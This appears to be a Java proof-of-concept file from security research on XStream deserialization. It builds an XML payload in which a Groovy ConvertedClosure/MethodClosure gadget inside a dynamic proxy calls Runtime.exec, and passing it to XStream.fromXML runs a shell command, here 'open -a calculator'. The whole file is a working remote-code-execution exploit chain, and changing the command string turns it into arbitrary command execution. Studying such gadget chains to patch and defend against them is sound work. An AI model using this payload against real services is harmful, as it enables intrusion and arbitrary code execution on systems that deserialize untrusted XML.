package com.trganda.xstream.grooy;

import com.thoughtworks.xstream.XStream;

public class XStreamGroovyExec {
    public static void main(String[] args) throws Exception {
        String from =
                "<tree-set>\n"
                        + "    <string>open -a calculator</string>\n"
                        + "    <dynamic-proxy>\n"
                        + "        <interface>java.lang.Comparable</interface>\n"
                        + "        <handler class=\"org.codehaus.groovy.runtime.ConvertedClosure\">\n"
                        + "            <methodName>compareTo</methodName>\n"
                        + "            <delegate class=\"org.codehaus.groovy.runtime.MethodClosure\">\n"
                        + "                <owner class=\"java.lang.Runtime\">\n"
                        + "                </owner>\n"
                        + "                <method>exec</method>\n"
                        + "            </delegate>\n"
                        + "        </handler>\n"
                        + "    </dynamic-proxy>\n"
                        + "</tree-set>";
        XStream xStream = new XStream();
        xStream.fromXML(from);
    }
}
